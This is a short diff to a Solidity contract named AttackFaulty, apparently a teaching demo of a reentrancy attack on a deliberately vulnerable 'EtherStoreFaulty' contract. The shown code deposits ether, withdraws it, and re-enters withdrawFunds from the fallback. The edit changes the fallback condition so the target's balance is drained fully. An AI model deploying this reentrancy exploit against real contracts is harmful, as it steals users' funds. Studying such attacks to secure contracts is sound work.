@@ -18,10 +18,8 @@ contract AttackFaulty {
         etherStoreFaulty = EtherStoreFaulty(_etherStoreFaultyAddress);
     }
 
-    // receive() external payable {}
-
     function attackEtherStoreFaulty() external payable {
-        require(msg.value >= 1 ether, "Required 1 ether.");
+        require(msg.value >= 1 ether, "Requires 1 ether.");
         etherStoreFaulty.depositFunds{value: 1 ether}();
         etherStoreFaulty.withdrawFunds(1 ether);
     }
@@ -31,7 +29,7 @@ contract AttackFaulty {
     }
 
     fallback() external payable {
-        if (address(etherStoreFaulty).balance > 1 ether) {
+        if (address(etherStoreFaulty).balance >= 1 ether) {
             etherStoreFaulty.withdrawFunds(1 ether);
         }
     }
